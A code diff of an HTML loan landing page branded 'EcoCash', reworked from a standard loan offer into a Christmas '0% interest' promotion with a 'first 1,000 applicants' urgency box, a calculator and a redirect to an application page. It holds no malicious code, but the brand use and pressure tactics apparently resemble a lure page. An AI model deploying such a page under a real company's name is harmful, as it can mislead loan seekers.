@@ -1,361 +1,419 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#003366">
-    <title>EcoCash Loan | Fast &amp; Secure Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --blue-dark: #001a33;
-            --blue: #003366;
-            --blue-mid: #004d99;
-            --blue-light: #0077cc;
-            --blue-bright: #00aaff;
-            --red: #e30613;
-            --green: #00a651;
-            --white: #ffffff;
-            --light: #f0f6ff;
-            --dark: #0d1b2a;
-            --muted: #5a6d80;
-            --border: #d0dce8;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#003366">
+<title>EcoCash | Festive Interest-Free Loans</title>
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-        body {
-            font-family: 'Poppins', system-ui, sans-serif;
-            color: var(--dark);
-            line-height: 1.6;
-            overflow-x: hidden;
-            background: #f0f4f8;
-        }
+<style>
+:root {
+    --blue-dark:#001a33;
+    --blue:#003b82;
+    --blue-light:#0878d1;
+    --red:#e30613;
+    --gold:#ffca28;
+    --white:#fff;
+    --text:#10233d;
+    --muted:#607087;
+    --border:#d8e3f0;
+}
+* { box-sizing:border-box; margin:0; padding:0; }
+html { scroll-behavior:smooth; }
+body {
+    font-family:Poppins,Arial,sans-serif;
+    color:var(--text);
+    background:#f0f5fb;
+    line-height:1.5;
+    overflow-x:hidden;
+}
+header {
+    background:white;
+    padding:15px 6%;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    box-shadow:0 3px 14px #001a3310;
+}
+.logo { font-size:26px; font-weight:900; text-decoration:none; }
+.eco { color:var(--blue); }
+.cash { color:var(--red); }
+nav { display:flex; gap:20px; }
+nav a { text-decoration:none; color:var(--text); font-size:13px; font-weight:600; }
 
-        .orb { position: fixed; border-radius: 50%; filter: blur(80px); z-index: -1; animation: float 15s infinite alternate ease-in-out; }
-        .orb-1 { width: 400px; height: 400px; background: rgba(0,51,102,0.15); top: -10%; left: -5%; }
-        .orb-2 { width: 350px; height: 350px; background: rgba(0,119,204,0.1); bottom: -5%; right: -5%; animation-delay: -5s; }
-        @keyframes float { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(30px,-50px) scale(1.1); } }
+.hero {
+    max-width:1150px;
+    margin:auto;
+    padding:55px 5%;
+    display:grid;
+    grid-template-columns:1fr 0.9fr;
+    align-items:center;
+    gap:40px;
+}
+.promo {
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    padding:9px 14px;
+    border-radius:50px;
+    background:#fff0f0;
+    color:#c90016;
+    border:1px solid #ffd1d5;
+    font-weight:800;
+    font-size:12px;
+    margin-bottom:20px;
+}
+h1 {
+    font-size:clamp(2.5rem,5vw,4.2rem);
+    line-height:1.05;
+    font-weight:900;
+    letter-spacing:-2px;
+    color:var(--blue-dark);
+}
+h1 .interest { color:var(--red); }
+h1 .festive { color:#e8a400; }
+.subtitle {
+    margin-top:20px;
+    color:var(--muted);
+    font-size:15px;
+    max-width:440px;
+}
+.limited {
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-top:25px;
+    padding:15px;
+    background:#fff;
+    border-radius:15px;
+    border:1px solid var(--border);
+    max-width:390px;
+}
+.limited i { font-size:25px; color:var(--red); }
+.limited strong { display:block; color:var(--blue-dark); font-size:15px; }
+.limited span { color:var(--muted); font-size:12px; }
 
-        header {
-            background: var(--white);
-            padding: 14px 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
+.glass-card {
+    background:#fff;
+    border:1px solid var(--border);
+    border-radius:25px;
+    padding:28px;
+    box-shadow:0 20px 55px #00336617;
+    position:relative;
+    overflow:hidden;
+}
+.glass-card:before {
+    content:"";
+    position:absolute;
+    top:0; left:0; right:0;
+    height:7px;
+    background:linear-gradient(90deg,var(--blue),var(--red),var(--gold));
+}
+.calc-header { text-align:center; margin-bottom:25px; }
+.calc-header .icon {
+    width:65px; height:65px;
+    margin:0 auto 12px;
+    border-radius:50%;
+    display:grid; place-items:center;
+    color:white;
+    font-size:27px;
+    background:var(--blue);
+}
+.calc-header h2 { font-size:23px; font-weight:900; }
+.calc-header p { font-size:12px; color:var(--muted); }
 
-        .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
-        .logo .eco { color: var(--blue); }
-        .logo .cash { color: var(--red); }
+.input-group { margin-bottom:25px; }
+.label-row {
+    display:flex;
+    justify-content:space-between;
+    gap:10px;
+    align-items:center;
+    margin-bottom:12px;
+}
+.label-row label { font-size:13px; font-weight:700; }
+.label-row span { font-size:17px; color:var(--blue); font-weight:900; }
 
-        nav { display: flex; gap: 24px; align-items: center; }
-        nav a { text-decoration: none; color: var(--dark); font-size: 14px; font-weight: 600; transition: color 0.2s; }
-        nav a:hover { color: var(--blue); }
+input[type=range] {
+    width:100%;
+    accent-color:var(--blue);
+    cursor:pointer;
+}
+.slider-limits {
+    display:flex;
+    justify-content:space-between;
+    color:var(--muted);
+    font-size:10px;
+    margin-top:5px;
+}
+.result-box {
+    padding:19px;
+    border-radius:15px;
+    background:#edf6ff;
+    margin-bottom:18px;
+    text-align:center;
+}
+.result-box .result-label { font-size:12px; color:var(--muted); }
+.result-box .monthly-payment {
+    color:var(--blue);
+    font-size:clamp(1.7rem,4vw,2.3rem);
+    font-weight:900;
+    line-height:1.3;
+}
+.interest-note {
+    display:inline-block;
+    margin-top:7px;
+    background:#dff7e8;
+    color:#08783d;
+    border-radius:30px;
+    padding:5px 12px;
+    font-size:11px;
+    font-weight:800;
+}
+.btn-apply {
+    width:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    padding:17px;
+    border:0;
+    border-radius:13px;
+    background:var(--red);
+    color:white;
+    font-family:inherit;
+    font-size:15px;
+    font-weight:900;
+    cursor:pointer;
+    box-shadow:0 8px 20px #e3061330;
+    transition:transform .2s,background .2s;
+}
+.btn-apply:hover { background:#bf0010; transform:translateY(-2px); }
+.terms { text-align:center; font-size:10px; color:var(--muted); margin-top:12px; }
 
-        .hero {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 60px 5% 70px;
-            gap: 40px;
-            max-width: 1200px;
-            margin: 0 auto;
-            min-height: 500px;
-        }
+#benefits { padding:40px 5% 60px; text-align:center; }
+.section-title { font-size:clamp(1.5rem,3vw,2rem); font-weight:900; color:var(--blue-dark); }
+.section-subtitle { color:var(--muted); font-size:13px; margin:7px 0 27px; }
+.benefits-grid {
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:18px;
+    max-width:950px;
+    margin:auto;
+}
+.benefit-card {
+    background:white;
+    padding:25px 18px;
+    border:1px solid var(--border);
+    border-radius:17px;
+}
+.benefit-icon {
+    width:55px; height:55px;
+    border-radius:16px;
+    display:grid; place-items:center;
+    background:#edf5ff;
+    color:var(--blue);
+    font-size:23px;
+    margin:0 auto 13px;
+}
+.benefit-card h3 { font-size:15px; margin-bottom:5px; }
+.benefit-card p { font-size:12px; color:var(--muted); }
 
-        .hero-left { flex: 1; max-width: 500px; }
+.season-banner {
+    max-width:950px;
+    margin:0 auto 55px;
+    padding:25px;
+    border-radius:20px;
+    color:white;
+    background:linear-gradient(120deg,#001a33,#0755a6);
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:20px;
+}
+.season-banner h2 { font-size:clamp(1.4rem,3vw,2rem); }
+.season-banner p { font-size:13px; opacity:.9; }
+.season-banner .tree { font-size:60px; }
 
-        .badges { display: flex; gap: 12px; margin-bottom: 20px; }
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: var(--white);
-            border: 1px solid var(--border);
-            padding: 8px 16px;
-            border-radius: 50px;
-            font-size: 12px;
-            font-weight: 700;
-            color: var(--blue);
-        }
-        .badge i { color: var(--blue-light); font-size: 14px; }
+footer {
+    padding:25px 5%;
+    text-align:center;
+    color:white;
+    background:var(--blue-dark);
+    font-size:12px;
+}
+footer p { opacity:.8; margin-top:5px; }
 
-        .hero-left h1 {
-            font-size: 3rem;
-            font-weight: 900;
-            line-height: 1.1;
-            color: var(--blue-dark);
-            margin-bottom: 16px;
-        }
-        .hero-left h1 .highlight { color: var(--blue); }
-
-        .hero-left p { font-size: 15px; color: var(--muted); line-height: 1.7; max-width: 440px; }
-
-        .hero-right { flex: 1; max-width: 440px; }
-
-        .glass-card {
-            background: rgba(255,255,255,0.7);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.8);
-            box-shadow: 0 8px 32px 0 rgba(0,26,51,0.1);
-            width: 100%;
-            border-radius: 24px;
-            padding: 36px 32px;
-        }
-
-        .calc-header { text-align: center; margin-bottom: 30px; }
-        .calc-header h2 { font-size: 22px; font-weight: 900; color: var(--blue-dark); }
-        .calc-header p { font-size: 13px; color: var(--muted); }
-
-        .input-group { margin-bottom: 28px; }
-        .label-row { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 12px; }
-        .label-row label { font-size: 14px; font-weight: 700; color: var(--dark); }
-        .label-row span { font-size: 18px; font-weight: 900; color: var(--blue); }
-
-        input[type="range"] {
-            width: 100%;
-            height: 6px;
-            background: var(--border);
-            border-radius: 3px;
-            outline: none;
-            -webkit-appearance: none;
-        }
-        input[type="range"]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 24px; height: 24px;
-            background: var(--blue);
-            border-radius: 50%;
-            cursor: pointer;
-            border: 3px solid var(--white);
-            box-shadow: 0 2px 8px rgba(0,51,102,0.25);
-        }
-        .slider-limits { display: flex; justify-content: space-between; font-size: 10px; color: var(--muted); font-weight: 600; margin-top: 6px; }
-
-        .result-box {
-            background: rgba(255,255,255,0.9);
-            border-left: 4px solid var(--blue);
-            border-radius: 12px;
-            padding: 18px 20px;
-            margin-bottom: 28px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .result-box label { font-size: 13px; font-weight: 600; color: var(--muted); }
-        .result-box .monthly-payment { font-size: 2rem; font-weight: 900; color: var(--blue); }
-
-        .btn-apply {
-            width: 100%;
-            background: var(--blue);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 14px;
-            font-weight: 800;
-            font-size: 15px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            cursor: pointer;
-            font-family: inherit;
-            box-shadow: 0 6px 20px rgba(0,51,102,0.3);
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .btn-apply:hover { background: var(--blue-light); transform: translateY(-1px); }
-
-        #benefits { text-align: center; padding: 60px 5%; }
-        #benefits h2 { font-size: 1.6rem; font-weight: 900; color: var(--blue-dark); margin-bottom: 30px; }
-
-        .benefits-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 24px; max-width: 800px; margin: 0 auto; }
-        .benefit-card { background: var(--white); border-radius: 16px; padding: 30px 24px; text-align: center; box-shadow: 0 4px 20px rgba(0,51,102,0.06); border: 1px solid var(--border); }
-        .benefit-icon { font-size: 36px; margin-bottom: 14px; }
-        .benefit-card h4 { font-size: 16px; font-weight: 800; color: var(--blue-dark); margin-bottom: 8px; }
-        .benefit-card p { font-size: 13px; color: var(--muted); line-height: 1.6; }
-
-        footer { background: var(--blue-dark); color: white; padding: 40px 5% 20px; }
-        .footer-grid { display: grid; grid-template-columns: 1.5fr 1fr 1fr; gap: 40px; margin-bottom: 30px; }
-        .footer-brand .logo { font-size: 22px; margin-bottom: 10px; display: inline-block; }
-        .footer-brand p { font-size: 13px; opacity: 0.7; line-height: 1.6; max-width: 300px; }
-        .footer-col h5 { font-size: 13px; font-weight: 800; margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--blue-bright); }
-        .footer-col a { display: block; color: rgba(255,255,255,0.7); text-decoration: none; font-size: 13px; margin-bottom: 10px; transition: color 0.2s; }
-        .footer-col a:hover { color: white; }
-        .footer-bottom { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 16px; text-align: center; font-size: 11px; opacity: 0.5; }
-
-        @media (max-width: 860px) {
-            .hero { flex-direction: column; padding: 40px 5%; text-align: center; }
-            .hero-left { max-width: 100%; }
-            .hero-left h1 { font-size: 2.2rem; }
-            .hero-left p { margin: 0 auto; }
-            .badges { justify-content: center; }
-            .hero-right { max-width: 100%; }
-        }
-        @media (max-width: 600px) {
-            .benefits-grid { grid-template-columns: 1fr; max-width: 350px; }
-            .footer-grid { grid-template-columns: 1fr; }
-            .hero-left h1 { font-size: 1.8rem; }
-        }
-    </style>
+@media(max-width:800px) {
+    nav { gap:12px; }
+    nav a { font-size:11px; }
+    .hero { grid-template-columns:1fr; padding:38px 5%; gap:30px; }
+    .hero-left { text-align:center; }
+    .subtitle { margin-left:auto; margin-right:auto; }
+    .limited { margin:22px auto 0; text-align:left; }
+    .benefits-grid { grid-template-columns:1fr; max-width:430px; }
+    .season-banner { margin-left:5%; margin-right:5%; }
+}
+@media(max-width:420px) {
+    header { padding:12px 4%; }
+    .logo { font-size:22px; }
+    nav { gap:9px; }
+    nav a { font-size:10px; }
+    .hero { padding-top:30px; }
+    .glass-card { padding:23px 18px; }
+    h1 { letter-spacing:-1px; }
+}
+</style>
 </head>
+
 <body>
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
+<header>
+    <a href="#home" class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#benefits">Benefits</a>
+        <a href="#contact">Contact</a>
+    </nav>
+</header>
 
-    <header>
-        <a href="#" class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></a>
-        <nav>
-            <a href="#home">Home</a>
-            <a href="#about">About Us</a>
-            <a href="#faq">FAQ</a>
-            <a href="#contact">Contact</a>
-        </nav>
-    </header>
-
-    <section class="hero" id="home">
-        <div class="hero-left">
-            <div class="badges">
-                <div class="badge"><i class="fa-solid fa-bolt"></i> Instant Approval</div>
-                <div class="badge"><i class="fa-solid fa-shield-halved"></i> Bank-level Security</div>
-            </div>
-            <h1>Empower Your Dreams with <span class="highlight">EcoCash Loans</span></h1>
-            <p>Get the funds you need instantly directly into your EcoCash wallet. No collateral required, just fair rates and flexible repayment terms.</p>
+<main>
+<section class="hero" id="home">
+    <div class="hero-left">
+        <div class="promo">
+            <i class="fa-solid fa-gift"></i>
+            FESTIVE SEASON OFFER
         </div>
 
-        <div class="hero-right">
-            <div class="glass-card">
-                <div class="calc-header">
-                    <h2>Loan Calculator</h2>
-                    <p>Customize your loan to fit your needs</p>
-                </div>
+        <h1>
+            <span class="interest">0% INTEREST</span><br>
+            LOANS FOR A<br>
+            <span class="festive">MERRY CHRISTMAS!</span>
+        </h1>
 
-                <div class="input-group">
-                    <div class="label-row">
-                        <label>Loan Amount</label>
-                        <span id="amount-display">USD 2,500</span>
-                    </div>
-                    <input type="range" id="amount-slider" min="500" max="10000" step="100" value="2500">
-                    <div class="slider-limits"><span>USD 500</span><span>USD 10,000</span></div>
-                </div>
+        <p class="subtitle">
+            Make your festive plans happen with an interest-free loan offer.
+        </p>
 
-                <div class="input-group">
-                    <div class="label-row">
-                        <label>Loan Term</label>
-                        <span id="term-display">6 months</span>
-                    </div>
-                    <input type="range" id="term-slider" min="1" max="6" step="1" value="6">
-                    <div class="slider-limits"><span>1 month</span><span>6 months</span></div>
-                </div>
-
-                <div class="result-box">
-                    <label>Monthly Payment</label>
-                    <div class="monthly-payment" id="payment-display">USD 56</div>
-                </div>
-
-                <button class="btn-apply" id="apply-btn">APPLY NOW <i class="fa-solid fa-arrow-right"></i></button>
+        <div class="limited">
+            <i class="fa-solid fa-fire"></i>
+            <div>
+                <strong>FIRST 1,000 APPLICANTS!</strong>
+                <span>Check eligibility and offer terms.</span>
             </div>
         </div>
-    </section>
+    </div>
 
-    <section id="benefits">
-        <h2>Why Choose EcoCash Loans?</h2>
-        <div class="benefits-grid">
-            <div class="benefit-card">
-                <div class="benefit-icon">&#9889;</div>
-                <h4>Fast Disbursements</h4>
-                <p>Once approved, your loan is credited instantly to your connected EcoCash account. No waiting in lines.</p>
+    <div class="hero-right">
+        <div class="glass-card">
+            <div class="calc-header">
+                <div class="icon"><i class="fa-solid fa-gift"></i></div>
+                <h2>Festive Loan Calculator</h2>
+                <p>Estimate your repayments</p>
             </div>
-            <div class="benefit-card">
-                <div class="benefit-icon">&#128200;</div>
-                <h4>Low Interest Rates</h4>
-                <p>We offer highly competitive rates starting from 8.9% monthly, ensuring you only pay for what you truly need.</p>
+
+            <div class="input-group">
+                <div class="label-row">
+                    <label for="amount-slider">Loan Amount</label>
+                    <span id="amount-display">USD 2,500</span>
+                </div>
+                <input type="range" id="amount-slider" min="500" max="10000" step="100" value="2500">
+                <div class="slider-limits"><span>USD 500</span><span>USD 10,000</span></div>
             </div>
-            <div class="benefit-card">
-                <div class="benefit-icon">&#128241;</div>
-                <h4>100% Digital</h4>
-                <p>Manage your entire loan lifecycle right from your phone. Apply, track, and repay effortlessly.</p>
+
+            <div class="input-group">
+                <div class="label-row">
+                    <label for="term-slider">Repayment Period</label>
+                    <span id="term-display">6 months</span>
+                </div>
+                <input type="range" id="term-slider" min="1" max="6" step="1" value="6">
+                <div class="slider-limits"><span>1 month</span><span>6 months</span></div>
             </div>
+
+            <div class="result-box">
+                <div class="result-label">Estimated monthly repayment</div>
+                <div class="monthly-payment" id="payment-display">USD 416.67</div>
+                <div class="interest-note">0% INTEREST</div>
+            </div>
+
+            <button class="btn-apply" id="apply-btn">
+                CHECK ELIGIBILITY <i class="fa-solid fa-arrow-right"></i>
+            </button>
+            <p class="terms">Eligibility, fees and loan terms apply. Review the agreement before accepting.</p>
         </div>
-    </section>
+    </div>
+</section>
 
-    <footer>
-        <div class="footer-grid">
-            <div class="footer-brand">
-                <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-                <p>The lending platform designed to simplify your financial life in Zimbabwe.</p>
-            </div>
-            <div class="footer-col">
-                <h5>Quick Links</h5>
-                <a href="#home">Home</a>
-                <a href="#about">About Us</a>
-                <a href="#">EcoCash</a>
-            </div>
-            <div class="footer-col">
-                <h5>Legal</h5>
-                <a href="#">Terms of Service</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Loan Agreement</a>
-            </div>
+<section id="benefits">
+    <h2 class="section-title">A Little More Christmas Cheer</h2>
+    <p class="section-subtitle">Simple. Digital. Convenient.</p>
+
+    <div class="benefits-grid">
+        <div class="benefit-card">
+            <div class="benefit-icon"><i class="fa-solid fa-percent"></i></div>
+            <h3>0% Interest</h3>
+            <p>No interest during the eligible promotional offer. Applicable fees, if any, will be disclosed.</p>
         </div>
-        <div class="footer-bottom">&copy; 2026 EcoCash Zimbabwe. All rights reserved.</div>
-    </footer>
+        <div class="benefit-card">
+            <div class="benefit-icon"><i class="fa-solid fa-mobile-screen-button"></i></div>
+            <h3>Apply by Phone</h3>
+            <p>Complete your application online.</p>
+        </div>
+        <div class="benefit-card">
+            <div class="benefit-icon"><i class="fa-solid fa-calendar-check"></i></div>
+            <h3>Know Your Terms</h3>
+            <p>Review repayment details before accepting an offer.</p>
+        </div>
+    </div>
+</section>
 
-    <script>
-        const amountSlider = document.getElementById('amount-slider');
-        const termSlider = document.getElementById('term-slider');
-        const amountDisplay = document.getElementById('amount-display');
-        const termDisplay = document.getElementById('term-display');
-        const paymentDisplay = document.getElementById('payment-display');
-        const applyBtn = document.getElementById('apply-btn');
-        const INTEREST_RATE = 0.089;
+<section class="season-banner">
+    <div>
+        <h2>Make This Season Special 🎄</h2>
+        <p>Explore the festive loan offer and check your eligibility.</p>
+    </div>
+    <div class="tree" aria-hidden="true">🎄🎁</div>
+</section>
+</main>
 
-        function calculatePayment() {
-            const principal = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            const totalInterest = principal * INTEREST_RATE * months;
-            const total = principal + totalInterest;
-            const monthly = total / months;
+<footer id="contact">
+    <div class="logo"><span style="color:white">Eco</span><span class="cash">Cash</span></div>
+    <p>Festive loan promotion. Eligibility and terms apply.</p>
+    <p>Only use verified, official lending channels.</p>
+    <p style="margin-top:15px">&copy; 2026. All rights reserved.</p>
+</footer>
 
-            amountDisplay.textContent = 'USD ' + principal.toLocaleString();
-            termDisplay.textContent = months + (months === 1 ? ' month' : ' months');
-            paymentDisplay.textContent = 'USD ' + monthly.toFixed(2);
-        }
+<script>
+const amountSlider = document.getElementById('amount-slider');
+const termSlider = document.getElementById('term-slider');
+const amountDisplay = document.getElementById('amount-display');
+const termDisplay = document.getElementById('term-display');
+const paymentDisplay = document.getElementById('payment-display');
+const applyBtn = document.getElementById('apply-btn');
 
-        amountSlider.addEventListener('input', calculatePayment);
-        termSlider.addEventListener('input', calculatePayment);
-        calculatePayment();
+function calculatePayment() {
+    const principal = Number(amountSlider.value);
+    const months = Number(termSlider.value);
 
-        applyBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            this.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
-            this.style.opacity = '0.8';
-            this.style.cursor = 'not-allowed';
-            setTimeout(function() {
-                window.location.href = 'apply.html';
-            }, 1500);
-        });
-    </script>
-    <!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/6a60b491ee7ee01d46231b54/default';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
+    // Illustrative calculation at 0% interest, before any applicable fees.
+    const monthly = principal / months;
+
+    amountDisplay.textContent = 'USD ' + principal.toLocaleString('en-US');
+    termDisplay.textContent = months + (months === 1 ? ' month' : ' months');
+    paymentDisplay.textContent = 'USD ' + monthly.toLocaleString('en-US', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+    });
+}
+
+amountSlider.addEventListener('input', calculatePayment);
+termSlider.addEventListener('input', calculatePayment);
+calculatePayment();
+
+applyBtn.addEventListener('click', function() {
+    window.location.href = 'apply.html';
+});
 </script>
-<!--End of Tawk.to Script-->
 </body>
 </html>
